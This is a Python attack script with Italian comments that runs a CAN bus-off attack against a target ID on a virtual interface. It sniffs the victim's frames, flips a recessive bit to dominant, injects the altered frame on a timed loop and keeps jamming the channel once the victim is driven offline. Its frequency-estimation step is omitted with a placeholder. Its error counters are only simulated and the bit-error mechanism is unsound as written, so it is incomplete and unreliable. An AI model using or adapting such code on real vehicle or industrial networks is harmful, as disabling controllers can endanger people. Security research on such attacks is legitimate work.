import can
import time
import sys
import random

# --- CONFIGURAZIONE ---
CAN_INTERFACE = 'vcan0'
TARGET_ID = 0x123 
BUS_OFF_THRESHOLD = 256
TEC_PASSIVE_THRESHOLD = 128
SAMPLE_SIZE = 5
INITIAL_TEC = 0
# ----------------------

# Definiamo la posizione di inizio della ricerca (dopo ID, RTR, Controllo)
# Assumiamo un frame standard (11 bit ID, 1 bit RTR, 4 bit Controllo -> 16 bit totali)
# Il primo byte (8 bit) del campo Dati inizia all'indice 16 del payload totale.
BIT_FLIP_START_INDEX = 0 # Iniziamo a cercare dall'inizio del campo dati (msg.data[0])

def bytes_to_bitstring(data):
    """Converte un array di byte in una stringa binaria (little-endian)."""
    return ''.join(f'{b:08b}' for b in data)

def bitstring_to_bytes(bit_string):
    """Converte una stringa binaria in un array di byte."""
    data = bytearray()
    for i in range(0, len(bit_string), 8):
        data.append(int(bit_string[i:i+8], 2))
    return list(data)

def find_and_flip(data_bytes):
    """Trova il primo bit '1' (Recessivo) e lo flippa a '0' (Dominante)."""
    original_bit_string = bytes_to_bitstring(data_bytes)
    modified_bit_string = list(original_bit_string)
    flip_index = -1
    
    # Cerchiamo il primo '1' (Recessivo) per forzare il '0' (Dominante)
    for i in range(BIT_FLIP_START_INDEX, len(modified_bit_string)):
        if modified_bit_string[i] == '1':
            modified_bit_string[i] = '0' # Flip a Dominante (0)
            flip_index = i
            break
            
    if flip_index == -1:
        # Se non ci sono bit Recessivi (es. payload tutto a zero), usiamo l'originale
        return data_bytes, -1 
        
    modified_bit_string = "".join(modified_bit_string)
    modified_bytes = bitstring_to_bytes(modified_bit_string)
    
    return modified_bytes, flip_index

def start_attacker_bit_flip():
    
    try:
        bus = can.interface.Bus(channel=CAN_INTERFACE, bustype='socketcan', receive_own_messages=False)
        print(f"✅ [Attaccante] Connesso a {CAN_INTERFACE}.")
    except OSError as e:
        print(f"❌ [Attaccante] Errore di connessione: {e}")
        return

    # ... [Logica per la stima della frequenza omessa per brevità ma da includere] ...
    # ... [Assumiamo che estimated_period sia stato calcolato] ...
    estimated_period = 5.0 # (Sostituire con il risultato della FASE 1)
    
    # Variabili di stato
    victim_tec_sim = INITIAL_TEC
    adversary_tec_sim = INITIAL_TEC
    attack_counter = 0
    next_attack_time = time.time() + estimated_period 

    print("\n--- FASE 2: ATTACCO CHIRURGICO (Bit Flipping) ---")

    while True: # Loop infinito per la persistenza
        
        time_to_wait = next_attack_time - time.time()
        
        if time_to_wait > 0:
            time.sleep(time_to_wait)
        
        # 1. RICEZIONE/SNIFFING DEL MESSAGGIO DI RIFERIMENTO DELLA VITTIMA
        # Riceviamo il frame della Vittima per copiarlo. Usiamo un timeout breve.
        reference_msg = bus.recv(timeout=0.01) 

        # 2. CALCOLO E PREPARAZIONE DELL'ATTACCO
        if reference_msg is not None and reference_msg.arbitration_id == TARGET_ID:
            
            # --- TEC SIMULATO ---
            if victim_tec_sim < BUS_OFF_THRESHOLD:
                if victim_tec_sim < TEC_PASSIVE_THRESHOLD:
                    victim_tec_change, adversary_tec_change = 8, 8
                    fase_desc = "Fase 1 (Active)"
                else:
                    victim_tec_change, adversary_tec_change = 7, -1 
                    fase_desc = "Fase 2 (Passive)"
                
                victim_tec_sim += victim_tec_change
                adversary_tec_sim += adversary_tec_change

                print(f"\n--- CICLO ATTACCANTE #{attack_counter+1} ({time.strftime('%H:%M:%S')}) ---")
                print(f"[{fase_desc}] TEC Sim: V={victim_tec_sim} ({victim_tec_change:+d}), A={adversary_tec_sim} ({adversary_tec_change:+d})")
            else:
                print(f"\n--- CICLO PERSISTENTE #{attack_counter+1} ({time.strftime('%H:%M:%S')}) ---")
                print(f"🔥 [Persistenza] Vittima in Bus Off (TEC {victim_tec_sim}). Continuo a bloccare il canale...")

            # --- MANIPOLAZIONE BIT ---
            modified_data, flip_index = find_and_flip(reference_msg.data)

            if flip_index != -1:
                # 3. INIEZIONE CHIRURGICA
                msg_attack = can.Message(
                    arbitration_id=TARGET_ID,
                    data=modified_data, 
                    is_extended_id=False
                )
                bus.send(msg_attack)
                print(f"💣 [Attaccante] Iniettato Bit Error al bit #{flip_index} (Recessivo -> Dominante).")
            else:
                print("⚠️ Messaggio Vittima tutto Dominante (0) o errore, invio frame generico d'attacco.")
                # Fallback: invia un frame generico d'attacco
                bus.send(can.Message(arbitration_id=TARGET_ID, data=[0x00]*8, is_extended_id=False))
            
            attack_counter += 1
            
        else:
             # Nessun messaggio di riferimento trovato nello slot atteso (jitter o Vittima si è fermata)
             print("...Nessun messaggio della Vittima trovato nello slot atteso...")

        # 4. Controllo e Aggiornamento del Tempo
        if adversary_tec_sim >= BUS_OFF_THRESHOLD:
            print("🚨🚨 [Attaccante] BUS OFF RILEVATO! Interrompo l'attacco.")
            break
            
        next_attack_time += estimated_period
        
    bus.shutdown()
    print("\n🛑 [Attaccante] Disconnesso.")

if __name__ == '__main__':
    start_attacker_bit_flip()
